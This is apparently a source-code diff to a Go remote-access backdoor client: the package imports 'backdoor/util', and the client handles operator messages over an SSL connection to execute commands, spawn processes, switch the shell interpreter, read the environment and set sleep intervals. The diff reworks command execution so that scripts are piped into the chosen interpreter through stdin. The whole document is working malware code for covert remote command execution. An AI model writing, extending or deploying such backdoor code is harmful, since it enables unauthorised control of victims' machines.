@@ -3,6 +3,8 @@ package main
 import (
 	"backdoor/util"
 	"bytes"
+	"fmt"
+	"io"
 	"io/ioutil"
 	"os"
 	"os/exec"
@@ -16,7 +18,7 @@ import (
 type CmdClient struct {
 	conn        *util.SSLConn
 	msgchan     *util.MsgChan
-	gcmds       []string
+	interp      string
 	fileName    string
 	fileData    []byte
 	fileDataZip []byte
@@ -175,7 +177,7 @@ func (client *CmdClient) procExec(msg []byte) {
 	if len(cmdStr) == 0 {
 		return
 	}
-	out, err := execCmd(client.getCmdArr(cmdStr))
+	out, err := execCmd(client.interp, cmdStr)
 	if err != nil {
 		util.SendCmdMsg(client.conn, util.CMD_PRINT, []byte(err.Error()))
 	}
@@ -189,16 +191,15 @@ func (client *CmdClient) procNewProcessExec(msg []byte) {
 	if len(cmdStr) == 0 {
 		return
 	}
-	arr := client.getCmdArr(cmdStr)
-	go execCmd(arr)
+	go execCmd(client.interp, cmdStr)
 }
 
 func (client *CmdClient) procSetShell(msg []byte) {
-	cmdStr := strings.TrimSpace(string(msg))
-	if len(cmdStr) == 0 {
+	interp := strings.TrimSpace(string(msg))
+	if len(interp) == 0 {
 		return
 	}
-	client.gcmds = strings.Split(cmdStr, " ")
+	client.interp = interp
 }
 func (client *CmdClient) procGetEnv(msg []byte) {
 	var buffer bytes.Buffer
@@ -241,14 +242,20 @@ func (client *CmdClient) procSetSleep(msg []byte) {
 	atomic.StoreUint64(&gtimeout, seconds)
 }
 
-func (client *CmdClient) getCmdArr(arg string) []string {
-	tmp := make([]string, len(client.gcmds))
-	copy(tmp, client.gcmds)
-	tmp = append(tmp, arg)
-	return tmp
-}
-
-func execCmd(arr []string) ([]byte, error) {
-	cmd := exec.Command(arr[0], arr[1:]...)
-	return cmd.CombinedOutput()
+func execCmd(interpreter string, script string) ([]byte, error) {
+	c := exec.Command(interpreter)
+	stdin, err := c.StdinPipe()
+	if err != nil {
+		return nil, err
+	}
+	var b bytes.Buffer
+	c.Stdout = &b
+	c.Stderr = &b
+	if err := c.Start(); err != nil {
+		return nil, err
+	}
+	io.WriteString(stdin, fmt.Sprintf("%s\n", script))
+	stdin.Close()
+	err = c.Wait()
+	return b.Bytes(), err
 }
